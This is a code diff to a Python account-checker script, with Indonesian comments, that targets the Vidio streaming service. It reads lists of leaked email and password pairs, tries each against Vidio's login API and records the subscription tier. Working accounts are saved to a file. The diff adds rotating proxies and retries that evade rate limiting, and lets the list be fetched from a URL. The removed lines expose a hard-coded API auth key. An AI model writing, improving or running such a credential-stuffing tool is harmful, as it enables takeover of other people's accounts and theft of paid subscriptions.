@@ -1,8 +1,13 @@
-import requests
-from colorama import Fore, init
-import uuid
+import argparse
 import os
 import re
+import uuid
+
+import requests
+from colorama import Fore, init
+
+from config import X_API_AUTH
+from proxy_manager import ProxyManager
 
 # ----------------- Variabel Tambahan -----------------
 
@@ -14,16 +19,23 @@ def session_id():
 
 # ----------------- Fungsi Login -----------------
 
-def fungsi_login(email, password, user_token=None, user_auth_email=None):
+def fungsi_login(
+    email,
+    password,
+    user_token=None,
+    user_auth_email=None,
+    proxy_manager: ProxyManager = None,
+    max_retries: int = 3,
+):
     headers = {
         "X-Api-Platform": "tv-android",
-        "X-Api-Auth": "laZOmogezono5ogekaso5oz4Mezimew1",
+        "X-Api-Auth": X_API_AUTH,
         "User-Agent": userAgent_vidio,
         "X-Api-App-Info": xApiInfo_vidio,
         "Accept-Language": "en",
         "X-Visitor-Id": session_id(),
         "Content-Type": "application/x-www-form-urlencoded",
-        "Accept-Encoding": "gzip"
+        "Accept-Encoding": "gzip",
     }
 
     if user_token and user_auth_email:
@@ -36,20 +48,35 @@ def fungsi_login(email, password, user_token=None, user_auth_email=None):
         "password": password
     }
 
-    response = requests.post(url, headers=headers, data=param)
+    attempt = 0
+    current_proxy = proxy_manager.get_next_proxy() if proxy_manager else None
+    while attempt < max_retries:
+        try:
+            response = requests.post(
+                url,
+                headers=headers,
+                data=param,
+                timeout=10,
+                proxies=current_proxy,
+            )
+            if response.status_code == 200:
+                return response
+        except requests.RequestException as e:
+            print(Fore.RED + f"Request error: {e}")
 
-    if response.status_code != 200:
-        print(Fore.RED + f"Login gagal untuk {email}")
-        return None
+        attempt += 1
+        if proxy_manager:
+            current_proxy = proxy_manager.get_next_proxy()
 
-    return response
+    print(Fore.RED + f"Login gagal untuk {email}")
+    return None
 
 # ----------------- Fungsi Get Subs -----------------
 
 def fungsi_get_subs(user_token, email):
     headers = {
         "X-Api-Platform": "tv-android",
-        "X-Api-Auth": "laZOmogezono5ogekaso5oz4Mezimew1",
+        "X-Api-Auth": X_API_AUTH,
         "User-Agent": userAgent_vidio,
         "X-Api-App-Info": xApiInfo_vidio,
         "Accept-Language": "id",
@@ -59,13 +86,12 @@ def fungsi_get_subs(user_token, email):
     }
 
     url = "https://api.vidio.com/api/users/subscriptions"
-
-    response = requests.get(url, headers=headers)
-
     try:
-        product_catalog = response.json()['subscriptions'][0]["product_catalog"]["code"]
+        response = requests.get(url, headers=headers, timeout=10)
+        response.raise_for_status()
+        product_catalog = response.json()["subscriptions"][0]["product_catalog"]["code"]
         return product_catalog
-    except (KeyError, IndexError):
+    except (requests.RequestException, KeyError, IndexError):
         return None
 
 # ----------------- Simpan ke file anti duplikat -----------------
@@ -84,9 +110,18 @@ def save_to_file(email, password, filename="live.txt"):
 
 # ----------------- Baca Akun dari file & Regex -----------------
 
-def proses_akun(file_akun="akun.txt"):
-    with open(file_akun, "r") as f:
-        lines = f.read().splitlines()
+def proses_akun(file_akun="akun.txt", proxy_manager: ProxyManager = None):
+    if re.match(r"^https?://", file_akun):
+        try:
+            resp = requests.get(file_akun, timeout=10)
+            resp.raise_for_status()
+            lines = resp.text.splitlines()
+        except requests.RequestException as e:
+            print(Fore.RED + f"Gagal mengambil daftar akun: {e}")
+            return
+    else:
+        with open(file_akun, "r") as f:
+            lines = f.read().splitlines()
 
     pattern = re.compile(r"https?://(?:www\.|m\.)?vidio\.com:(.+?):(.+)")
     
@@ -101,7 +136,7 @@ def proses_akun(file_akun="akun.txt"):
 
         print(Fore.CYAN + f"\n[•] Proses login {email}")
 
-        login_response = fungsi_login(email=email, password=password)
+        login_response = fungsi_login(email=email, password=password, proxy_manager=proxy_manager)
         if login_response:
             data = login_response.json()
             user_token = data.get("user", {}).get("user_token")
@@ -123,4 +158,23 @@ def proses_akun(file_akun="akun.txt"):
 
 if __name__ == "__main__":
     init(autoreset=True)
-    proses_akun("akun.txt")
+    parser = argparse.ArgumentParser()
+    parser.add_argument(
+        "akun",
+        nargs="?",
+        default="akun.txt",
+        help="Path atau URL daftar akun",
+    )
+    parser.add_argument(
+        "--use-proxy",
+        action="store_true",
+        help="Gunakan proxy saat melakukan request",
+    )
+    args = parser.parse_args()
+
+    pm = None
+    if args.use_proxy:
+        pm = ProxyManager()
+        pm.download_proxies()
+
+    proses_akun(args.akun, proxy_manager=pm)
